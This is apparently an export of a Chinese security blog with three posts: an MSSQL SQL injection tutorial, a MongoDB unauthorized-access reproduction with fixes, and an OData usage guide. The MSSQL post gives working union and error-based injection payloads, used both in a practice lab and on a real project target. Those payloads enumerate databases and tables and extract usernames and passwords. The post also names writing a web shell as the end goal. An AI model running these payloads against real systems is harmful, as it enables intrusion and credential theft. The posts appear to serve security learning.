<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>​        MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。</p>
<p>对于MSSQL注入需要注意的是:</p>
<ul>
<li>注入点的注入类型,是字符型还是数字型</li>
<li>注入点的权限问题,是<code>sa</code>、<code>db_owner</code>还是<code>public</code>.对与<code>mssql</code>有三个权限，<code>sa</code>（最高权限，相当于system），<code>db</code>（文件管理，数据库操作等等，相当于user-administrator），<code>public</code>（数据库操作权限，相当于guest-users）</li>
<li>注入点是否报错显示，对于字符型报错点是否可以使用注释语句</li>
</ul>
<p>​    </p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><ul>
<li><p>MSSQL自带库–&gt;master数据库</p>
</li>
<li><p>每个库都有一个系统自带表–&gt;sysobjects</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该系统表值得记住的字段:NAME字段 XTYPE字段  ID字段</span><br><span class="line">Name:表名信息</span><br><span class="line">Xtype:代表表达类型。S参数代表系统自带表，U参数代表用户创建的表 </span><br><span class="line">Id:用来连接syscolumns表</span><br></pre></td></tr></table></figure>
</li>
<li><p>top关键字限制输出数据.与MYSQL中的limit关键字相同用来限制输出数据条数，如输出一条数据 (top 1)，输出第二条数据(top 1+).</p>
</li>
<li><p>注释符号为–</p>
</li>
</ul>
<h3 id="常用参数函数"><a href="#常用参数函数" class="headerlink" title="常用参数函数"></a>常用参数函数</h3><ul>
<li>@@version:当前数据库 版本</li>
<li>@@servername:当前运行服务器 名称</li>
<li>db_name:当前数据库名称</li>
<li>user:当前 数据库执行 用户</li>
<li>IS_SERVRoLEMEMBER():查询数据库权限。常用权限sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin,证明为相应权限返回1.</li>
</ul>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询使用union进行连接查询语句</p>
<ul>
<li>判断注入点后，使用order by获取查询字段数 </li>
<li>使用union后面连接查询语句</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxxx union select null,null,null,null,(查询语句)  from   xxxx   where   xxx=xxx</span><br></pre></td></tr></table></figure>



<h3 id="报错查询"><a href="#报错查询" class="headerlink" title="报错查询"></a>报错查询</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字型:and 1=(select @@version)</span><br><span class="line">字符型:‘ and 1=(select @@version)--</span><br></pre></td></tr></table></figure>

<p>由于括号里面的查询结果为字符类型，而前面的1为整型。系统会将字符类型转换为整型，肯定与前面的数字1不相等，所以报错。在转换为整数型之前会将查询语句进行查询。</p>
<h3 id="步骤-x2F-思路"><a href="#步骤-x2F-思路" class="headerlink" title="步骤&#x2F;思路"></a>步骤&#x2F;思路</h3><ul>
<li><p>首先判断注入点字段位置，注入点类型为字符型还是数字型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数字型: and 1=1--  and 1=2--</span><br><span class="line">字符型: ‘ and  1=1--  ’ and 1=2--</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断注入点查询注入方式:联合查询 、报错查询、布尔&#x2F;时间盲注</p>
<p>若使用order by查询出该查询语句查询字段后，则可以尝试是否可以使用union联合查询(可能会过滤转义特殊字符)</p>
<p>若联合查询特殊字符被过滤并且目标系统存在报错回显信息，尝试报错查询注入</p>
<p>若前两者都不能，则尝试布尔&#x2F;时间盲注。通过一些mssql数据库中的函数比如exist(),substring()等获取</p>
</li>
<li><p>通过注入查询方式按照数据库基本信息(当前数据库名称，用户，运行服务器，执行权限)–&gt;数据表–&gt;数据列–&gt;敏感信息数据–&gt;写 shell木马文件–&gt;连接服务器，获取权限</p>
</li>
</ul>
<h2 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h2><p>靶场地址:<a href="https://www.mozhe.cn/bug/detail/SXlYMWZhSm15QzM1OGpyV21BR1p2QT09bW96aGUmozhe">SQL手工注入漏洞测试(Sql Server数据库)<em>SQL注入_在线靶场_墨者学院</em></a></p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209101901336.png" class title="image-20211209101901336">



<p>靶场页面如下，显示一个管理系统登录页面</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209102146559.png" class title="image-20211209102146559">



<p>在尝试使用弱口令登录错误后，缓过来这个注入不应该在登录中。看到下面有个通知，点进去看到通过id值来获取页面，可能存在注入点，下面进行探测</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103101249.png" class title="image-20211209103101249">



<p>通过两者构造不同判断出该id字段存在注入点</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103627865.png" class title="image-20211209103627865">

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209103601097.png" class>



<p>该注入点为数字型注入，先判断查询字段数进行查询(使用order by x)</p>
<p>当字段为5时显示错误，则查询字段为4</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209104844041.png" class title="image-20211209104844041">



<p>我们判断可以使用联合注入进行查询，下面判断回显字段，返回第二个和第三个字段并且为字符型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-2%20union%20all%20select%20null,%272%27,%273%27,4</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209105701949.png" class title="image-20211209105701949">

<p>确定回显字段后，在对应字段输入查询信息进行查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-2%20union%20all%20select%20null,(@@version),(@@servername),4</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110027614.png" class title="image-20211209110027614">



<p>查询数据库名称和当前用户</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209110409888.png" class title="image-20211209110409888">





<p>爆数据库中数据表 </p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112032551.png" class title="image-20211209112032551">

<p>查询数据表中的列.这里通过col_name()函数获取对应数据表的第几个列名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-2%20union%20all%20select%201,(select%20top%201%20col_name(object_id(%27manage%27),1)%20from%20sysobjects),%20%273%27,4</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209112946811.png" class title="image-20211209112946811">

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113059383.png" class title="image-20211209113059383">

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113121041.png" class title="image-20211209113121041">



<p>查询获得的username和password列后，接着就去获取该字段值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d=-2%20union%20all%20select%201,username,password,4%20from%20manage</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113324585.png" class title="image-20211209113324585">

<p>MD5解密获取明文密码</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113424120.png" class title="image-20211209113424120">



<p>登录系统成功，获取flag</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211209113522221.png" class title="image-20211209113522221">



<h2 id="项目实战"><a href="#项目实战" class="headerlink" title="项目实战"></a>项目实战</h2><p>下面对在项目中遇到的MSSQL注入进行记录学习。</p>
<p>修改content字段为单引号，此时服务器报错显示引号不完整。可以判断该注入点为字符型注入。</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140003887.png" class title="image-20211208140003887">



<p>使用报错注入查询数据库相关数据信息，如下:</p>
<h3 id="获取数据库版本"><a href="#获取数据库版本" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20@@version)--</span><br></pre></td></tr></table></figure>

<p>可以在报错信息中看到数据库版本</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140631370.png" class title="image-20211208140631370">



<h3 id="获取数据库名称"><a href="#获取数据库名称" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20db_name())--</span><br></pre></td></tr></table></figure>

<p>在报错信息中看到数据库名称</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208140940039.png" class title="image-20211208140940039">



<h3 id="获取运行服务器名称"><a href="#获取运行服务器名称" class="headerlink" title="获取运行服务器名称"></a>获取运行服务器名称</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20@@servername)--</span><br></pre></td></tr></table></figure>

<p>在报错信息中看到服务器名称.</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208141524584.png" class title="image-20211208141524584">



<h3 id="获取用户数据库名称"><a href="#获取用户数据库名称" class="headerlink" title="获取用户数据库名称"></a>获取用户数据库名称</h3><h4 id="获取第一个用户数据库名称"><a href="#获取第一个用户数据库名称" class="headerlink" title="获取第一个用户数据库名称"></a>获取第一个用户数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">‘%20and%201=(select%20top%201%20name%20from%20master..sysdatabases%20where%20dbid&gt;4)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142347154.png" class title="image-20211208142347154">



<h4 id="获取第二个用户数据库名称"><a href="#获取第二个用户数据库名称" class="headerlink" title="获取第二个用户数据库名称"></a>获取第二个用户数据库名称</h4><p>当获取第一个用户数据库后，接着利用第一个用户数据名称来获取其他用户数据库名称</p>
<p>查询方式1:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20master..sysdatabases%20where%20dbid&gt;4%20and%20name!=&#x27;ReportServer&#x27;)--</span><br></pre></td></tr></table></figure>

<p>查询方式2:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20master..sysdatabases%20where%20dbid&gt;5)--</span><br></pre></td></tr></table></figure>



<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208142956055.png" class title="image-20211208142956055">

<p>可以按照这样的方法来一个一个获取用户数据库名称</p>
<h4 id="获取所有数据库名称"><a href="#获取所有数据库名称" class="headerlink" title="获取所有数据库名称"></a>获取所有数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20name%20from%20master..sysdatabases%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>

<p>将查询结果以xml形式展示</p>
<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208143508464.png" class title="image-20211208143508464">



<h3 id="获取数据库表名"><a href="#获取数据库表名" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h3><h4 id="获取用户表名"><a href="#获取用户表名" class="headerlink" title="获取用户表名"></a>获取用户表名</h4><p>通过sysobjects数据表来查询用户创建的数据表</p>
<p>查询第一个数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;)--</span><br></pre></td></tr></table></figure>



<p>我们也可以使用SQL注入中的常用的information_schema数据库进行查询 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20table_name%20from%20information_schema.tables)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144010998.png" class title="image-20211208144010998">



<p>查询第二个数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;%20and%20name!=&#x27;UsersInfoB&#x27;)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208145218103.png" class title="image-20211208145218103">

<p>和上面逐一获取数据库一样，照着此法获取数据表名。</p>
<h4 id="获取所有数据库名"><a href="#获取所有数据库名" class="headerlink" title="获取所有数据库名"></a>获取所有数据库名</h4><p>将查询结果以xml文件一起输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20name%20from%20sysobjects%20where%20xtype=&#x27;u&#x27;%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208144538119.png" class title="image-20211208144538119">



<h3 id="获取数据库列名"><a href="#获取数据库列名" class="headerlink" title="获取数据库列名"></a>获取数据库列名</h3><h4 id="获取列名称"><a href="#获取列名称" class="headerlink" title="获取列名称"></a>获取列名称</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20name%20from%20syscolumns%20where%20id=(select%20id%20from%20sysobjects%20where%20name=&#x27;UsersInfoB&#x27;))--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153340533.png" class title="image-20211208153340533">

<p>以此来依次获取列名，同上。</p>
<h4 id="获取所有列名"><a href="#获取所有列名" class="headerlink" title="获取所有列名"></a>获取所有列名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20%20name%20from%20syscolumns%20where%20id=(select%20id%20from%20sysobjects%20where%20name=&#x27;UsersInfoB&#x27;)%20for%20xml%20path)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208153316387.png" class title="image-20211208153316387">



<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>这里以UsersInfo数据表来获取相应字段数据</p>
<p>查询用户名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20Username%20from%20UsersInfoB%20where%20id=1)</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155305278.png" class title="image-20211208155305278">



<p>查询密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;+and+1=(select%20top%201%20Userpass%20from%20UsersInfoB%20where%20id=1)--</span><br></pre></td></tr></table></figure>

<img src="/2021/12/09/MSSQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/image-20211208155402794.png" class title="image-20211208155402794">

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>SQL注入</category>
        <category>MSSQL注入</category>
      </categories>
      <tags>
        <tag>-web漏洞 -SQL注入 -MSSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB未授权访问漏洞</title>
    <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
<p>安装前先安装依赖包</p>
<p><strong>Red Hat&#x2F;CentOS：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install libcurl openssl</span><br></pre></td></tr></table></figure>



<p><strong>Ubuntu 18.04 LTS (“Bionic”)&#x2F;Debian 10 “Buster”：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl4 openssl</span><br></pre></td></tr></table></figure>



<p><strong>Ubuntu 16.04 LTS (“Xenial”)&#x2F;Debian 9 “Stretch”：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libcurl3 openssl</span><br></pre></td></tr></table></figure>



<p>下载MongoDB</p>
<p>MongoDB 源码下载地址：<a href="https://www.mongodb.com/download-center/#community">https://www.mongodb.com/download-center\#community</a></p>
<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1ed1e326da0b82a3ba6a9acc177ad6d1.jpg" class>



<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5fc344136eee4a58c0d0dcd509a488df.jpg" class>

<p>MongoDB的可执行文件在bin目录下，将其添加到$PATH路径中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=\&lt;mongodb-install-directory\&gt;/bin:\$PATH</span><br></pre></td></tr></table></figure>



<p>创建数据库目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mkdir -p /data/db</span><br></pre></td></tr></table></figure>



<p>创建数据库存放目录和日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /data               //创建数据库目录</span><br><span class="line"></span><br><span class="line">sudo mkdir db    //创建日志</span><br><span class="line"></span><br><span class="line">sudo touch log</span><br></pre></td></tr></table></figure>



<p>命令行中启动MongoDB服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> cd 安装路径/mongo/bin</span><br><span class="line"></span><br><span class="line">sudo ./mongod --dbpath=/data/db --   logpath=/data/logs</span><br></pre></td></tr></table></figure>



<p>Mongodb启动成功</p>
<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/393a5bd543d9da0ed85c0dec2efcdec4.png" class>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录Mongodb控制台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令: mongod 127.0.0.1:27017</span><br></pre></td></tr></table></figure>

<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/996ace683b6e8b7130df8cda3d0efc62.png" class>



<p>登录成功后，使用语句进行查询操作，发现数据库admin没有数据，没有添加用户</p>
<img src="/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3186b9e9e72cf57cf9585d9f09ddbcbe.png" class>



<h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>(1) 为 MongoDB 添加认证</p>
<p>① MongoDB 启动时添加 -auth 参数。</p>
<p>② 给 MongoDB 添加用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use admin \# 使用 admin 库</span><br><span class="line"></span><br><span class="line">db.addUser“用户名” “密码”\# 添加用户名、密码</span><br><span class="line"></span><br><span class="line">db.auth“用户名”,“密码”\# 验证是否添加成功返回 1 说明成功。</span><br></pre></td></tr></table></figure>



<p>(2) 禁用 HTTP 和 REST 端口</p>
<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6<br>版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过<br>Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohttpinterface = false</span><br></pre></td></tr></table></figure>



<p>(3) 限制绑定 IP</p>
<p>启动时加入参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--bind_ip 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>或在 &#x2F;etc&#x2F;mongodb.conf 文件中添加以下内容 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind_ip = 127.0.0.1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>未授权访问</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -未授权访问 -MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>ODATA用法简介</title>
    <url>/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="ODATA用法小记"><a href="#ODATA用法小记" class="headerlink" title="ODATA用法小记"></a>ODATA用法小记</h1><hr>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
<p>开放数据协议（Open Data Protocol，简称OData）是一种描述如何创建和访问<a href="https://baike.baidu.com/item/Restful">Restful</a>服务的<a href="https://baike.baidu.com/item/OASIS/4235159">OASIS</a>标准。该标准由<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF/124767">微软</a>发起 ,前三个版本1.0、2.0、3.0都是微软开放标准，遵循微软开放规范承诺书（Microsoft Open Specification Promise).第四个版本4.0于2014年3月17日在<a href="https://baike.baidu.com/item/OASIS/4235159">OASIS</a>投票通过成为开放工业标准 .</p>
<p>对于使用OData的开发人员而言，可以将OData服务简化理解为一个<strong>URI(Uniform Resource Identifier)统一资源标识符</strong>，它是一种满足RESTful设计风格的Web服务有关OData的的协议的详细介绍，可以访问<a href="http://www.odata.org/">www.odata.org</a></p>
<h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><hr>
<p>ODATA由“格式”和“协议”这两部分组成。格式定义了如何描述数据，协议定义了如何操作数据，所以我们可以及那个ODATA理解为接口协议，因为它规定了数据格式和数据操作标准。</p>
<h3 id="通用格式定义语言-CSDL"><a href="#通用格式定义语言-CSDL" class="headerlink" title="通用格式定义语言(CSDL)"></a>通用格式定义语言(CSDL)</h3><p>OData服务的数据模型是通过<a href="https://baike.baidu.com/item/EDM/3131413">EDM</a>（实体数据模型）来定义的。通用格式定义语言（Common Schema Definition Language (CSDL)）定义了OData服务的<a href="https://baike.baidu.com/item/EDM/3131413">EDM</a>模型的一种XML格式的表现形式。</p>
<p>它的内容包括：</p>
<ul>
<li>CSDL的命名空间</li>
<li>实体模型的<a href="https://baike.baidu.com/item/%E5%B0%81%E8%A3%85/2796965">封装</a></li>
<li>实体模型的普通特性</li>
<li>具体的XML元素和属性介绍</li>
</ul>
<h3 id="核心协议及URL规范"><a href="#核心协议及URL规范" class="headerlink" title="核心协议及URL规范"></a>核心协议及URL规范</h3><p>核心协议主要定义了开放数据协议的核心语义和行为。它们包括：</p>
<ul>
<li>数据模型</li>
<li>服务模型</li>
<li>协议和模型的版本管理</li>
<li>拓展性</li>
<li>数据格式</li>
<li><a href="https://baike.baidu.com/item/HTTP">HTTP</a>头</li>
<li><a href="https://baike.baidu.com/item/HTTP">HTTP</a>状态码</li>
<li>上下文URL（context URL）</li>
<li>数据请求和响应</li>
<li>安全性</li>
<li>一致性（Conformance）</li>
</ul>
<p>URL规范主要定义了一系列推荐（非强制）采用的构建用于访问OData服务中的数据和模型的URL的规则。它们包括：</p>
<ul>
<li>URL的组成部分</li>
<li>服务的根URL</li>
<li>资源路径</li>
<li>查询语句</li>
</ul>
<p>URL的形式如下:</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116103541596.png" class title="image-20211116103541596">



<p>可以知道，通过OData这种方式，我们可以<strong>将一个数据源、服务发布成一个public的URI</strong>，因此对于服务的使用者（Consumer）而言, 其并不需要关系OData背后的具体开发语言或技术，其只需要满足HTTP通信协议即可。</p>
<h3 id="服务结构"><a href="#服务结构" class="headerlink" title="服务结构"></a>服务结构</h3><p>OData的服务结构包括：</p>
<p>1）服务文档（Service Document）：描述了OData Service中可用的数据的概览信息,也即OData中所含的Entity Set信息。</p>
<p>2）服务元结构文档（Service Metadata Document）：在元结构文档中，描述了OData服务中的数据类型及其相关的属性，也即Entity Type和Property。</p>
<p>在以上两种文档中包含了：</p>
<ol>
<li><p>实体集合（Entity Set）：等同于RSS中的Feed节点，是某一种信息的集合</p>
</li>
<li><p>实体（Entity）：等同于RSS中的Entry节点，描述了具体某一条目信息的内容</p>
</li>
</ol>
<ol start="3">
<li><p>实体类型（Entity Type）：表明实体的类型，每一个实体都对应一个Entity Type</p>
</li>
<li><p>属性（Property）: 实体具体的属性</p>
</li>
<li><p>导航属性（Navigation Property）：用于描述层级关系，例如Category - Sub-category这种关系</p>
</li>
<li><p>关联（Association）：描述关联关系</p>
</li>
</ol>
<p>示例访问ODATA文件:</p>
<p># 访问OData的Service Document：</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/">https://services.odata.org/V3/Northwind/Northwind.svc/</a></p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116105053919.png" class title="image-20211116105053919">

<p>在OData的service document中可以看到所有的Entity Set</p>
<p>#访问ODATA的Medata Document:</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/$metadata">https://services.odata.org/V3/Northwind/Northwind.svc/$metadata</a></p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116105523325.png" class title="image-20211116105523325">

<p>在OData的metadata document中可找到Entity Type和Property</p>
<p># 访问OData中具体的某一个Entity Set实体集合：</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/Products">https://services.odata.org/V3/Northwind/Northwind.svc/Products</a></p>
<p>Products为实体集合名称，前面的为网站根目录</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116105622393.png" class title="image-20211116105622393">



<p># 访问OData中具体的某一个Entiry实体:</p>
<p> <a href="https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)">https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)</a></p>
<p>OData采用圆括号作为表示单独实体的键值的字段（key segment）</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116112103418.png" class title="image-20211116112103418">



<p># 访问OData服务中，某一Entity实体的属性：</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)/productID">https://services.odata.org/V3/Northwind/Northwind.svc/Product(1)/productID</a></p>
<p>product(1)为实体，productID为 实体中的某一属性</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116112135292.png" class title="image-20211116112135292">

<p>如果想查看某一具体的实体，则直接在OData Service Document的URL后直接append上具体的实体名称即可，例如上例中的实体集合Customers；在实体集合中，每一条entry也即对应着一条数据的Entity。</p>
<p>#访问Odata服务中，某一属性的原始值:</p>
<p><a href="https://services.odata.org/V3/Northwind/Northwind.svc/product(1)/productID/$value">https://services.odata.org/V3/Northwind/Northwind.svc/product(1)/productID/$value</a></p>
<h2 id="ODATA常用操作"><a href="#ODATA常用操作" class="headerlink" title="ODATA常用操作"></a>ODATA常用操作</h2><p>下表列举了一些常用的Odata操作:</p>
<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116112457200.png" class title="image-20211116112457200">



<h3 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h3><h4 id="选择查询-select"><a href="#选择查询-select" class="headerlink" title="选择查询($select)"></a>选择查询($select)</h4><p>$select用于选择实体的哪些属性被包含在返回的数据中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询格式：GET  ~/实体类型?$select=实体属性1，实体属性2</span><br></pre></td></tr></table></figure>



<p>示例:</p>
<p>返回Category属性在包含的数据中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://services.odata.org/V3/Northwind/Northwind.svc/Products?$select=Category</span><br></pre></td></tr></table></figure>

<img src="/2021/11/15/ODATA%E7%94%A8%E6%B3%95%E7%AE%80%E4%BB%8B/image-20211116134650724.png" class title="image-20211116134650724">



<h4 id="展开查询-expand"><a href="#展开查询-expand" class="headerlink" title="展开查询($expand)"></a>展开查询($expand)</h4><p>$expand的查询帮助将实体类型的导航属性的值加入请求的返回数据中，查询获取实体集合下的其他实体子集。</p>
